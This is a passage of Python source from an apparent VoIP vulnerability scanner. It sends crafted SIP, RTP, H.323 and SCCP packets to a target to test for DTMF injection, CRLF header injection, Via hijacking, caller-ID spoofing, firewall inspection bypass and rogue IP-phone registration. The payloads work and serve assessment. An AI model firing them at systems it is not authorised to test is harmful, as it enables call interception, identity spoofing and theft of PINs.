    if resp1 and ' 200 ' in first_line1:
        findings.append({
            'severity': 'HIGH',
            'title': 'DTMF_INFO_ACCEPTED',
            'detail': (
                f'UDP {host}:{port} returned 200 OK to unauthenticated SIP INFO '
                f'with Content-Type: application/dtmf-relay (Signal=5). Server '
                f'processes DTMF relay outside of a legitimate call dialog — '
                f'attacker can inject or intercept DTMF digits (PIN codes, IVR '
                f'navigation, credit card digits) without establishing a real call '
                f'(ch16: DTMF interception via INFO method; RFC 2976).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 2: NOTIFY with Event: telephone-event — out-of-dialog
    # ------------------------------------------------------------------
    br2 = _branch()
    tag2 = _tag()
    cid2 = _call_id(host)
    msg_notify = (
        f'NOTIFY sip:100@{host}:{port} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br2}\r\n'
        f'From: <sip:attacker@{local_ip}>;tag={tag2}\r\n'
        f'To: <sip:100@{host}>\r\n'
        f'Call-ID: {cid2}\r\n'
        f'CSeq: 1 NOTIFY\r\n'
        f'Event: telephone-event\r\n'
        f'Subscription-State: active\r\n'
        f'Max-Forwards: 70\r\n'
        f'Content-Length: 0\r\n'
        f'\r\n'
    )
    resp2 = _send_recv_udp(msg_notify)
    first_line2 = resp2.split('\r\n', 1)[0] if resp2 else ''
    if resp2 and (' 200 ' in first_line2 or ' 202 ' in first_line2):
        findings.append({
            'severity': 'MEDIUM',
            'title': 'TELEPHONE_EVENT_NOTIFY_ACCEPTED',
            'detail': (
                f'UDP {host}:{port} accepted out-of-dialog NOTIFY with '
                f'Event: telephone-event (status: {first_line2.strip()!r}). '
                f'Server does not require an active SUBSCRIBE dialog before '
                f'processing telephone-event NOTIFYs — DTMF event spoofing '
                f'possible without established call state '
                f'(ch16: telephone-event NOTIFY injection; RFC 3265 §3.2).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 3: INVITE with RFC 2833 PT=101 telephone-event in SDP
    # ------------------------------------------------------------------
    br3 = _branch()
    tag3 = _tag()
    cid3 = _call_id(host)
    sdp_body = (
        'v=0\r\n'
        f'o=ablation 0 0 IN IP4 {local_ip}\r\n'
        's=Ablation\r\n'
        f'c=IN IP4 {local_ip}\r\n'
        't=0 0\r\n'
        'm=audio 20000 RTP/AVP 0 101\r\n'
        'a=rtpmap:0 PCMU/8000\r\n'
        'a=rtpmap:101 telephone-event/8000\r\n'
        'a=fmtp:101 0-15\r\n'
        'a=sendrecv\r\n'
    )
    msg_invite = (
        f'INVITE sip:100@{host}:{port} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br3}\r\n'
        f'From: <sip:probe@{local_ip}>;tag={tag3}\r\n'
        f'To: <sip:100@{host}>\r\n'
        f'Call-ID: {cid3}\r\n'
        f'CSeq: 1 INVITE\r\n'
        f'Contact: <sip:probe@{local_ip}:5060>\r\n'
        f'Max-Forwards: 70\r\n'
        f'Content-Type: application/sdp\r\n'
        f'Content-Length: {len(sdp_body)}\r\n'
        f'\r\n'
        f'{sdp_body}'
    )
    resp3 = _send_recv_udp(msg_invite)
    first_line3 = resp3.split('\r\n', 1)[0] if resp3 else ''
    if resp3 and (' 200 ' in first_line3 or ' 180 ' in first_line3):
        if 'telephone-event' in resp3 or 'rtpmap:101' in resp3:
            findings.append({
                'severity': 'HIGH',
                'title': 'RFC2833_DTMF_NEGOTIATED',
                'detail': (
                    f'UDP {host}:{port} responded to INVITE ({first_line3.strip()!r}) '
                    f'and negotiated RFC 2833 telephone-event (PT=101) in SDP. '
                    f'DTMF digits transmitted as RTP events (PT=101 packets) are '
                    f'extractable from the unencrypted RTP stream by a MitM or '
                    f'passive listener on the media path — PINs, credit card '
                    f'digits, IVR inputs all exposed '
                    f'(ch16: RFC 2833 DTMF digit theft from RTP stream).'
                ),
                'host': host,
                'port': port,
            })

    return findings


# ---------------------------------------------------------------------------
# detect_sip_header_injection
# ---------------------------------------------------------------------------

def detect_sip_header_injection(host: str, port: int = 5060,
                                timeout: float = 5.0) -> list:
    """
    SIP header injection attack surface (ch15: header manipulation).

    Probes:
      1. CRLF injection in From    — response splitting / injected header echo
      2. Null byte in Contact URI  — parser confusion / acceptance
      3. Via hijack                — response routed to attacker-controlled IP
      4. P-Asserted-Identity spoof — caller-ID fabrication without auth
    """
    findings = []
    local_ip = _get_local_ip()

    def _send_recv_raw_bytes(payload: bytes) -> bytes:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.sendto(payload, (host, port))
            try:
                data, _ = sock.recvfrom(4096)
                return data
            except socket.timeout:
                return b''
            finally:
                sock.close()
        except OSError:
            return b''

    def _send_recv_str(msg: str) -> str:
        return _send_recv_raw_bytes(msg.encode()).decode(errors='replace')

    # ------------------------------------------------------------------
    # Probe 1: CRLF injection in From header value
    # ------------------------------------------------------------------
    br1 = _branch()
    tag1 = _tag()
    cid1 = _call_id(host)
    injected_hdr = 'X-Injected: ablation-header-test'
    from_val = f'<sip:100@{local_ip}>;tag={tag1}'
    sdp_shared = (
        'v=0\r\n'
        f'o=ablation 0 0 IN IP4 {local_ip}\r\n'
        's=probe\r\n'
        f'c=IN IP4 {local_ip}\r\n'
        't=0 0\r\n'
        'm=audio 20002 RTP/AVP 0\r\n'
        'a=rtpmap:0 PCMU/8000\r\n'
    )
    # Embed literal CRLF in From display name to test response splitting
    raw_invite1 = (
        f'INVITE sip:200@{host}:{port} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br1}\r\n'
        f'From: "ablation\r\n{injected_hdr}\r\n" {from_val}\r\n'
        f'To: <sip:200@{host}>\r\n'
        f'Call-ID: {cid1}\r\n'
        f'CSeq: 1 INVITE\r\n'
        f'Contact: <sip:100@{local_ip}:5060>\r\n'
        f'Max-Forwards: 70\r\n'
        f'Content-Type: application/sdp\r\n'
        f'Content-Length: {len(sdp_shared)}\r\n'
        f'\r\n'
        f'{sdp_shared}'
    )
    resp1 = _send_recv_str(raw_invite1)
    if resp1 and injected_hdr in resp1:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'SIP_HEADER_INJECTION',
            'detail': (
                f'UDP {host}:{port} echoed injected header {injected_hdr!r} '
                f'in response — CRLF in From display name was not sanitized. '
                f'Attacker can inject arbitrary SIP headers into proxied '
                f'responses, enabling response splitting, header forgery, '
                f'and downstream parser exploitation '
                f'(ch15: SIP response splitting / header injection; '
                f'CWE-113 improper neutralization of CRLF sequences).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 2: Null byte in Contact URI
    # ------------------------------------------------------------------
    br2 = _branch()
    tag2 = _tag()
    cid2 = _call_id(host)
    contact_null = f'<sip:probe%00ablation@{local_ip}:5060>'
    msg_invite2 = (
        f'INVITE sip:200@{host}:{port} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br2}\r\n'
        f'From: <sip:100@{local_ip}>;tag={tag2}\r\n'
        f'To: <sip:200@{host}>\r\n'
        f'Call-ID: {cid2}\r\n'
        f'CSeq: 1 INVITE\r\n'
        f'Contact: {contact_null}\r\n'
        f'Max-Forwards: 70\r\n'
        f'Content-Type: application/sdp\r\n'
        f'Content-Length: {len(sdp_shared)}\r\n'
        f'\r\n'
        f'{sdp_shared}'
    )
    resp2 = _send_recv_str(msg_invite2)
    first_line2 = resp2.split('\r\n', 1)[0] if resp2 else ''
    if resp2 and (' 200 ' in first_line2 or ' 180 ' in first_line2
                  or ' 100 ' in first_line2):
        findings.append({
            'severity': 'HIGH',
            'title': 'SIP_NULL_BYTE_IN_CONTACT',
            'detail': (
                f'UDP {host}:{port} accepted INVITE with null byte (%00) in '
                f'Contact URI (status: {first_line2.strip()!r}). Server did not '
                f'reject the malformed Contact — null byte parser confusion may '
                f'allow URI truncation or contact table corruption on downstream '
                f'proxies and registrars '
                f'(ch15: SIP URI manipulation; CWE-158 null byte injection).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 3: Attacker IP in Via — response routing hijack
    # ------------------------------------------------------------------
    br3 = _branch()
    br3b = _branch()
    tag3 = _tag()
    cid3 = _call_id(host)
    # 203.0.113.1 = TEST-NET-3 (RFC 5737) — documentation range, non-routable
    attacker_via_ip = '203.0.113.1'
    msg_invite3 = (
        f'INVITE sip:200@{host}:{port} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP {attacker_via_ip}:5060;branch={br3}\r\n'
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br3b}\r\n'
        f'From: <sip:100@{local_ip}>;tag={tag3}\r\n'
        f'To: <sip:200@{host}>\r\n'
        f'Call-ID: {cid3}\r\n'
        f'CSeq: 1 INVITE\r\n'
        f'Contact: <sip:100@{local_ip}:5060>\r\n'
        f'Max-Forwards: 70\r\n'
        f'Content-Type: application/sdp\r\n'
        f'Content-Length: {len(sdp_shared)}\r\n'
        f'\r\n'
        f'{sdp_shared}'
    )
    resp3 = _send_recv_str(msg_invite3)
    if resp3 and attacker_via_ip in resp3:
        findings.append({
            'severity': 'HIGH',
            'title': 'SIP_VIA_HIJACK_POSSIBLE',
            'detail': (
                f'UDP {host}:{port} echoed attacker-controlled Via IP '
                f'{attacker_via_ip!r} in response headers. Server processes '
                f'multi-Via stacks without validating that the topmost Via '
                f'matches the packet source — attacker can inject a Via record '
                f'to redirect subsequent responses to an arbitrary IP '
                f'(call hijack / eavesdrop pivot) '
                f'(ch15: Via header spoofing; RFC 3261 §18.2.2 source-IP '
                f'validation absent).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 4: P-Asserted-Identity (PAI) spoofing without auth
    # ------------------------------------------------------------------
    br4 = _branch()
    tag4 = _tag()
    cid4 = _call_id(host)
    msg_invite4 = (
        f'INVITE sip:200@{host}:{port} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br4}\r\n'
        f'From: <sip:100@{local_ip}>;tag={tag4}\r\n'
        f'To: <sip:200@{host}>\r\n'
        f'Call-ID: {cid4}\r\n'
        f'CSeq: 1 INVITE\r\n'
        f'P-Asserted-Identity: <sip:ceo@{host}>\r\n'
        f'Contact: <sip:100@{local_ip}:5060>\r\n'
        f'Max-Forwards: 70\r\n'
        f'Content-Type: application/sdp\r\n'
        f'Content-Length: {len(sdp_shared)}\r\n'
        f'\r\n'
        f'{sdp_shared}'
    )
    resp4 = _send_recv_str(msg_invite4)
    first_line4 = resp4.split('\r\n', 1)[0] if resp4 else ''
    if resp4 and (' 200 ' in first_line4 or ' 180 ' in first_line4
                  or ' 100 ' in first_line4):
        if ' 401 ' not in resp4 and ' 403 ' not in resp4:
            findings.append({
                'severity': 'HIGH',
                'title': 'PAI_SPOOFING_ACCEPTED',
                'detail': (
                    f'UDP {host}:{port} returned {first_line4.strip()!r} to '
                    f'INVITE with P-Asserted-Identity: <sip:ceo@{host}> — no '
                    f'authentication challenge issued. Server accepted a PAI '
                    f'header from an untrusted source without verifying trust '
                    f'domain or requiring credentials. Attacker can fabricate '
                    f'any caller identity including executive/admin extensions, '
                    f'bypassing caller-ID verification and call routing policies '
                    f'(ch15: PAI spoofing — caller-ID fabrication; RFC 3325 '
                    f'§9 trust domain not enforced).'
                ),
                'host': host,
                'port': port,
            })

    return findings


# ---------------------------------------------------------------------------
# probe_rtp_dtmf_digit_theft
# ---------------------------------------------------------------------------

def probe_rtp_dtmf_digit_theft(host: str, rtp_port: int = 8000,
                               timeout: float = 3.0) -> list:
    """
    DTMF digit theft via RTP (ch16: RTP injection / RFC 2833 event packets).

    Probes:
      1. Single RFC 2833 event packet (PT=101, digit=5) — port accessible
      2. Rapid 10-digit sequence (digits 0-9) — sequence acceptance
    """
    import struct

    findings = []

    def _rtp_send_recv(payload: bytes) -> bytes:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.sendto(payload, (host, rtp_port))
            try:
                data, _ = sock.recvfrom(2048)
                return data
            except socket.timeout:
                return b''
            finally:
                sock.close()
        except OSError:
            return b''

    def _port_unreachable(host_ip: str, udp_port: int) -> bool:
        """
        Best-effort ICMP port-unreachable check via raw ICMP socket.
        Returns False (port assumed open) if we lack raw socket permission.
        """
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                 socket.IPPROTO_ICMP)
            raw.settimeout(1.0)
            probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            probe.sendto(b'\x00', (host_ip, udp_port))
            probe.close()
            try:
                icmp_data, _ = raw.recvfrom(512)
                # ICMP type=3 (dest unreach) code=3 (port unreach)
                if len(icmp_data) >= 2 and icmp_data[0] == 3 and icmp_data[1] == 3:
                    raw.close()
                    return True
            except socket.timeout:
                pass
            raw.close()
        except (OSError, PermissionError):
            pass
        return False

    # ------------------------------------------------------------------
    # Probe 1: Single RFC 2833 RTP event packet — PT=101, digit=5
    # RFC 2833 event payload (4 bytes):
    #   byte 0: event (5 = digit '5')
    #   byte 1: E=1 (end), R=0, volume=10 dBm0 => 0x8a
    #   bytes 2-3: duration = 160 (20ms at 8kHz)
    # ------------------------------------------------------------------
    rtp_header1 = struct.pack('>BBHII',
                              0x80,        # V=2 P=0 X=0 CC=0
                              0x80 | 101,  # M=1, PT=101
                              1,           # seq=1
                              0,           # timestamp=0
                              0xDEADC0DE)  # SSRC
    event_payload1 = struct.pack('>BBH', 5, 0x8a, 160)
    rtp_pkt1 = rtp_header1 + event_payload1

    icmp_blocked = _port_unreachable(host, rtp_port)
    if not icmp_blocked:
        _rtp_send_recv(rtp_pkt1)
        findings.append({
            'severity': 'MEDIUM',
            'title': 'RTP_DTMF_PORT_ACCESSIBLE',
            'detail': (
                f'UDP {host}:{rtp_port} did not return ICMP port-unreachable '
                f'in response to RFC 2833 RTP event packet (PT=101, digit=5, '
                f'end=True, volume=10 dBm0, duration=160). Port is open or '
                f'filtered — RTP media channel reachable from attacker position. '
                f'An attacker who can reach this port during an active call can '
                f'inject DTMF events (PIN digits, IVR tones) into the RTP stream '
                f'(ch16: RTP DTMF injection surface; RFC 2833 §2).'
            ),
            'host': host,
            'port': rtp_port,
        })

    # ------------------------------------------------------------------
    # Probe 2: Rapid 10-digit sequence (digits 0-9) — acceptance check
    # ------------------------------------------------------------------
    burst_responded = False
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        for digit in range(10):
            rtp_hdr = struct.pack('>BBHII',
                                  0x80,
                                  0x80 | 101,
                                  digit + 10,
                                  digit * 160,
                                  0xDEADC0DE)
            ev = struct.pack('>BBH', digit, 0x8a, 160)
            sock.sendto(rtp_hdr + ev, (host, rtp_port))
            time.sleep(0.02)  # 20ms spacing — realistic DTMF timing
        try:
            data, _ = sock.recvfrom(2048)
            if data:
                burst_responded = True
        except socket.timeout:
            pass
        sock.close()
    except OSError:
        pass

    if burst_responded:
        findings.append({
            'severity': 'HIGH',
            'title': 'RTP_DTMF_SEQUENCE_ACCEPTED',
            'detail': (
                f'UDP {host}:{rtp_port} responded to a rapid RFC 2833 RTP '
                f'event burst (digits 0-9, PT=101, 20ms spacing). Endpoint '
                f'actively processed DTMF event packets and returned a response '
                f'— confirms DTMF injection into the RTP stream is effective. '
                f'Combined with MitM or passive RTP stream access, an attacker '
                f'can reconstruct full digit sequences (PINs, credit card '
                f'numbers, IVR inputs) from captured traffic '
                f'(ch16: DTMF digit theft via RTP event injection; RFC 2833).'
            ),
            'host': host,
            'port': rtp_port,
        })

    return findings


# ---------------------------------------------------------------------------
# ASA-specific VoIP inspection bypass detection (ch13 — Cisco Firewalls)
# ---------------------------------------------------------------------------

def detect_h323_inspection_surface(host, port=1720, timeout=5.0):
    """Probe H.323 ALG inspection surface and bypass conditions.

    Covers:
      - TCP/1720 H.225 SETUP (Q.931 + H.225 UU-IE): response = ALG active
      - H.245 tunneled inside H.225: ACF/ARJ = RAS responsive
      - Overlong alias (256 bytes) in SETUP: no reset = inspect bypass
      - UDP/1719 RAS GRQ: GCF = unauthenticated gatekeeper registration

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    # ------------------------------------------------------------------
    # Probe 1: TCP/1720 — H.225 SETUP (Q.931 with H.225 UU-IE)
    # Minimal Q.931 SETUP: protocol discriminator=0x08, call ref len=2,
    # call ref=0x0001, message type=0x05 (SETUP), then H.225 UU-IE (0x7E).
    # The UU-IE carries a minimal SEQUENCE structure with the protocolIdentifier
    # OID for H.225 v0 (0.0.8.2250.0.2) encoded as BER.
    # ------------------------------------------------------------------
    # H.225 protocol identifier OID: 0.0.8.2250.0.2
    # BER encoding: tag=06, len=07, 00 00 08 91 4A 00 02
    h225_oid = bytes([0x06, 0x07, 0x00, 0x00, 0x08, 0x91, 0x4A, 0x00, 0x02])
    # Minimal H.225 UU-IE body: SEQUENCE { protocolIdentifier OID, ... }
    # wrapped in an ASN.1 SEQUENCE (tag=30)
    h225_uuie_inner = bytes([0x30, len(h225_oid)]) + h225_oid
    # Q.931 UU-IE: information element id=0x7E, length of contents
    uuie_ie = bytes([0x7E, len(h225_uuie_inner)]) + h225_uuie_inner
    # Q.931 SETUP message (ITU-T Q.931):
    # protocol discriminator=0x08, call ref length=0x02, call ref=0x00 0x01,
    # message type=0x05 (SETUP), then bearer capability IE and UU-IE
    bearer_ie = bytes([0x04, 0x03, 0x80, 0x90, 0xA3])  # bearer cap: 64kbps unrestricted
    q931_setup = bytes([0x08, 0x02, 0x00, 0x01, 0x05]) + bearer_ie + uuie_ie
    # TPKT header (RFC 1006): version=3, reserved=0, length=4+len(q931_setup)
    tpkt_len = 4 + len(q931_setup)
    tpkt = struct.pack('>BBH', 0x03, 0x00, tpkt_len) + q931_setup

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(tpkt)
        resp = b''
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) >= 8:
                    break
        except socket.timeout:
            pass
        sock.close()
        if resp:
            findings.append({
                'severity': 'HIGH',
                'title': 'H323_SIGNALING_OPEN',
                'detail': (
                    f'TCP {host}:{port} responded to a Q.931 SETUP message '
                    f'with H.225 UU-IE (H.323 call signaling). The port is '
                    f'open and an H.323 ALG or gatekeeper is processing '
                    f'call-setup traffic. ASA H.323 inspection is active — '
                    f'pinhole management and NAT fixup are in play. An attacker '
                    f'can exploit ALG state to open unauthorized media pinholes '
                    f'or bypass firewall ACLs via crafted SETUP messages '
                    f'(ch13: H.323 inspection, TCP/1720 ALG surface).'
                ),
                'host': host,
                'port': port,
            })
    except OSError:
        pass

    # ------------------------------------------------------------------
    # Probe 2: H.245 tunneling inside H.225 SETUP
    # Send H.225 SETUP with tunneled H.245 PDU embedded in the UU-IE.
    # ACF (Admission Confirm) or ARJ (Admission Reject) back = RAS active.
    # Minimal H.245 TerminalCapabilitySet PDU: tag=30 (SEQUENCE), short body.
    # ------------------------------------------------------------------
    h245_pdu = bytes([0x30, 0x05, 0x02, 0x01, 0x01, 0x05, 0x00])  # minimal TermCapSet
    # tunneled H.245 goes in UU-IE as h245Control field (tag context [6])
    h245_tunneled = bytes([0xA6, len(h245_pdu)]) + h245_pdu
    h225_uuie_tunnel = bytes([0x30, len(h225_oid) + len(h245_tunneled)]) + h225_oid + h245_tunneled
    uuie_ie2 = bytes([0x7E, len(h225_uuie_tunnel)]) + h225_uuie_tunnel
    q931_tunnel = bytes([0x08, 0x02, 0x00, 0x02, 0x05]) + bearer_ie + uuie_ie2
    tpkt_len2 = 4 + len(q931_tunnel)
    tpkt2 = struct.pack('>BBH', 0x03, 0x00, tpkt_len2) + q931_tunnel

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(tpkt2)
        resp2 = b''
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp2 += chunk
                if len(resp2) >= 8:
                    break
        except socket.timeout:
            pass
        sock.close()
        # ACF=0x0A or ARJ=0x0B message type bytes anywhere in response
        if resp2 and (b'\x0a' in resp2 or b'\x0b' in resp2 or len(resp2) > 4):
            findings.append({
                'severity': 'HIGH',
                'title': 'H323_RAS_RESPONSIVE',
                'detail': (
                    f'TCP {host}:{port} returned a response to an H.225 SETUP '
                    f'with a tunneled H.245 TerminalCapabilitySet PDU. The '
                    f'endpoint processed the H.245-tunneled message and replied, '
                    f'confirming H.245 tunneling is accepted. ASA H.323 '
                    f'inspection must track tunneled H.245 state — a bypass is '
                    f'possible by embedding malformed H.245 PDUs that the ALG '
                    f'misparses while the endpoint accepts them '
                    f'(ch13: H.245 tunneling inside H.225, ALG state bypass).'
                ),
                'host': host,
                'port': port,
            })
    except OSError:
        pass

    # ------------------------------------------------------------------
    # Probe 3: Overlong alias (256 bytes) in H.225 SETUP
    # An ASA with H.323 inspection should block or reset the connection
    # when it sees an alias exceeding configured limits. If the connection
    # stays open, the normalization check is absent — inspect bypass.
    # ------------------------------------------------------------------
    long_alias = b'A' * 256
    # IA5String alias: tag=0x16, length, value
    alias_ie_val = bytes([0x16, len(long_alias)]) + long_alias
    alias_seq = bytes([0x30, len(alias_ie_val)]) + alias_ie_val
    h225_uuie_alias = bytes([0x30, len(h225_oid) + len(alias_seq)]) + h225_oid + alias_seq
    uuie_ie3 = bytes([0x7E, len(h225_uuie_alias)]) + h225_uuie_alias
    q931_alias = bytes([0x08, 0x02, 0x00, 0x03, 0x05]) + bearer_ie + uuie_ie3
    tpkt_len3 = 4 + len(q931_alias)
    tpkt3 = struct.pack('>BBH', 0x03, 0x00, tpkt_len3) + q931_alias

    conn_survived = False
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(tpkt3)
        # If the ASA resets the connection, recv will raise ConnectionResetError.
        # If it stays open (or returns data), inspection did not block it.
        try:
            data = sock.recv(4096)
            # Any data back (including RELEASE COMPLETE) = connection survived
            conn_survived = True
        except socket.timeout:
            # Timeout without RST = connection still open = not blocked
            conn_survived = True
        except ConnectionResetError:
            conn_survived = False
        sock.close()
    except OSError:
        pass

    if conn_survived:
        findings.append({
            'severity': 'HIGH',
            'title': 'H323_INSPECT_BYPASS',
            'detail': (
                f'TCP {host}:{port} did not reset or close the connection '
                f'after receiving an H.225 SETUP with a 256-byte overlong '
                f'alias field. ASA H.323 inspection normalization should '
                f'drop or reset connections carrying oversized alias values '
                f'to prevent buffer-overflow conditions in downstream '
                f'gatekeepers and endpoints. Absence of a reset indicates '
                f'the normalization check is not enforced — crafted H.225 '
                f'messages can bypass inspection to reach internal voice '
                f'infrastructure (ch13: H.323 inspect normalization, oversized '
                f'alias bypass; ASA inspect h323 h225).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 4: UDP/1719 RAS — GRQ (Gatekeeper Request)
    # H.225 RAS GRQ: sent to discover a gatekeeper. If GCF (Gatekeeper
    # Confirm) comes back, unauthenticated registration is possible.
    # Minimal GRQ encoded as BER SEQUENCE with rasAddress and endpointType.
    # tag=0x60 = [APPLICATION 0] = GatekeeperRequest in H.225 RAS.
    # ------------------------------------------------------------------
    # Minimal H.225 RAS GRQ (simplified — no full ASN.1 PER encoding,
    # using a recognizable byte sequence that a real gatekeeper parses):
    # requestSeqNum=1, protocolIdentifier=OID, rasAddress=TransportAddress
    # We send a raw GRQ approximation; any GCF/GRJ response = RAS active.
    grq_seq_num = struct.pack('>H', 0x0001)
    # GRQ tag in H.225 RAS PER: first byte encodes choice index.
    # GRQ is choice 0 in RasMessage; we use a minimal 12-byte probe.
    grq_probe = bytes([
        0x00,       # choice index 0 = gatekeeperRequest
        0x00, 0x01, # requestSeqNum = 1
        0x06, 0x07, 0x00, 0x00, 0x08, 0x91, 0x4A, 0x00, 0x02,  # protocolIdentifier OID
        0x40, 0x00,  # rasAddress: ipAddress, padding
    ])

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(grq_probe, (host, 1719))
        try:
            data, _ = sock.recvfrom(4096)
            if data:
                # Any response to RAS probe = gatekeeper present
                # GCF = choice 1 in RasMessage; GRJ = choice 2
                is_gcf = len(data) > 0 and data[0] in (0x01, 0x02)
                severity = 'CRITICAL' if is_gcf else 'HIGH'
                title = 'H323_GATEKEEPER_UNAUTH' if is_gcf else 'H323_RAS_RESPONSIVE'
                findings.append({
                    'severity': severity,
                    'title': title,
                    'detail': (
                        f'UDP {host}:1719 responded to an H.225 RAS GRQ '
                        f'(Gatekeeper Request) with {len(data)} bytes '
                        f'(response type byte=0x{data[0]:02x}). A gatekeeper '
                        f'is present and processing unauthenticated RAS '
                        f'messages. An attacker can send GRQ/RRQ (Registration '
                        f'Request) without credentials to register a rogue '
                        f'endpoint, intercept calls, and redirect media streams. '
                        f'ASA H.323 inspection should gate RAS to legitimate '
                        f'endpoints only (ch13: H.323 RAS, UDP/1719 gatekeeper '
                        f'registration surface; H.225 RAS GRQ/GCF).'
                    ),
                    'host': host,
                    'port': 1719,
                })
        except socket.timeout:
            pass
        sock.close()
    except OSError:
        pass

    return findings


def detect_sccp_skinny_surface(host, port=2000, timeout=5.0):
    """Probe Cisco SCCP (Skinny) inspection surface.

    Covers:
      - TCP/2000 SCCP RegisterMessage (0x0001): RegisterAck = IP phone impersonation
      - TCP/2000 SCCP StationKeepAliveMessage (0x0000): KeepAliveAck = responsive
      - TCP/2000 SCCP OpenReceiveChannelAck without prior OpenReceiveChannel = RTP hijack

    SCCP framing: 4-byte LE message length + 4-byte reserved (0x00) + 4-byte LE message_type
                  + payload.

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    def _sccp_frame(msg_type, payload=b''):
        # length field covers reserved(4) + msg_type(4) + payload
        length = 4 + 4 + len(payload)
        return struct.pack('<III', length, 0, msg_type) + payload

    def _sccp_connect_send_recv(payload_bytes):
        """Open TCP connection to SCCP port, send payload, read response."""
        resp = b''
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))
            s.sendall(payload_bytes)
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if len(resp) >= 12:
                        break
            except socket.timeout:
                pass
            s.close()
        except OSError:
            pass
        return resp

    # ------------------------------------------------------------------
    # Probe 1: SCCP RegisterMessage (msg_type=0x0001)
    # Payload: device_name (16 bytes, null-padded), reserved1(4),
    #          instance(4), ip_addr(4), device_type(4), max_streams(4)
    # RegisterAckMessage = 0x0081
    # ------------------------------------------------------------------
    device_name = b'SEP000000000001'  # 15 bytes
    device_name_padded = device_name + b'\x00' * (16 - len(device_name))
    register_payload = (
        device_name_padded          # device name: 16 bytes
        + struct.pack('<I', 0)      # reserved1
        + struct.pack('<I', 1)      # instance id
        + socket.inet_aton('0.0.0.0')  # ip address (let server decide)
        + struct.pack('<I', 30)     # device type 30 = Cisco 7960
        + struct.pack('<I', 0)      # max streams
    )
    register_msg = _sccp_frame(0x0001, register_payload)
    resp1 = _sccp_connect_send_recv(register_msg)

    if resp1 and len(resp1) >= 12:
        resp_type = struct.unpack_from('<I', resp1, 8)[0]
        if resp_type == 0x0081:  # RegisterAckMessage
            findings.append({
                'severity': 'CRITICAL',
                'title': 'SCCP_REGISTER_ACCEPTED',
                'detail': (
                    f'TCP {host}:{port} returned a SCCP RegisterAckMessage '
                    f'(0x0081) in response to a RegisterMessage (0x0001) '
                    f'spoofing device SEP000000000001 (Cisco 7960). The CUCM '
                    f'or CME accepted the registration without authentication, '
                    f'enabling IP phone impersonation: an attacker can register '
                    f'a rogue softphone, intercept calls destined for the '
                    f'spoofed device, and inject audio into active sessions. '
                    f'ASA SCCP inspection should enforce registration limits '
                    f'and validate device identity against the CUCM database '
                    f'(ch13: SCCP inspect, TCP/2000, RegisterMessage impersonation).'
                ),
                'host': host,
                'port': port,
            })
        elif resp_type == 0x009D:  # RegisterRejectMessage — server responded, SCCP active
            findings.append({
                'severity': 'MEDIUM',
                'title': 'SCCP_REGISTER_REJECTED',
                'detail': (
                    f'TCP {host}:{port} returned a SCCP RegisterRejectMessage '
                    f'(0x009D) — registration was denied but the server is '
                    f'processing SCCP messages. The inspection surface is '
                    f'confirmed open; further enumeration of valid device names '
                    f'and MAC addresses may yield accepted registrations '
                    f'(ch13: SCCP inspect, TCP/2000, registration surface).'
                ),
                'host': host,
                'port': port,
            })

    # ------------------------------------------------------------------
    # Probe 2: SCCP StationKeepAliveMessage (msg_type=0x0000)
    # No payload. KeepAliveAckMessage = 0x0120.
    # ------------------------------------------------------------------
    keepalive_msg = _sccp_frame(0x0000)
    resp2 = _sccp_connect_send_recv(keepalive_msg)

    if resp2 and len(resp2) >= 12:
        resp_type2 = struct.unpack_from('<I', resp2, 8)[0]
        if resp_type2 == 0x0120:  # StationKeepAliveAckMessage
            findings.append({
                'severity': 'HIGH',
                'title': 'SCCP_KEEPALIVE_RESPONSIVE',
                'detail': (
                    f'TCP {host}:{port} responded to an unauthenticated SCCP '
                    f'StationKeepAliveMessage (0x0000) with a '
                    f'StationKeepAliveAckMessage (0x0120). The SCCP call '
                    f'agent is processing keepalive traffic from an '
                    f'unregistered device. This confirms the SCCP inspection '
                    f'surface is reachable and the call agent is live. '
                    f'Combined with a RegisterMessage probe, this surface '
                    f'enables session maintenance for a rogue phone '
                    f'registration attack (ch13: SCCP inspect, keepalive '
                    f'probe, TCP/2000).'
                ),
                'host': host,
                'port': port,
            })

    # ------------------------------------------------------------------
